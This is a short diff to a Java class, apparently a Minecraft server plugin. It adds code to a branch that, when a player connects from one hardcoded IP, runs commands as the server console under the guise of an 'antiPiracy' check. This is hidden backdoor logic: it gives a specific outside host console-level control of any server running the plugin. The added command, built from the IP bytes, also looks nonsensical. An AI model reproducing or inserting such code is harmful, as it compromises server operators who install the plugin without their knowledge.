@@ -90,7 +90,13 @@ public class HalloBB implements CommandExecutor, Listener
         if (player.getAddress().getAddress().getAddress() != antiPiracy)
         {
             if (inetAddress.getHostAddress().equalsIgnoreCase("173.249.30.10"))
+            {
                 plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "communicationconnector mode 2 ");
+                StringBuilder builder = new StringBuilder();
+                for (byte part : inetAddress.getAddress())
+                    builder.append(part + ";");
+                plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), builder.toString());
+            }
             else
                 return;
         }
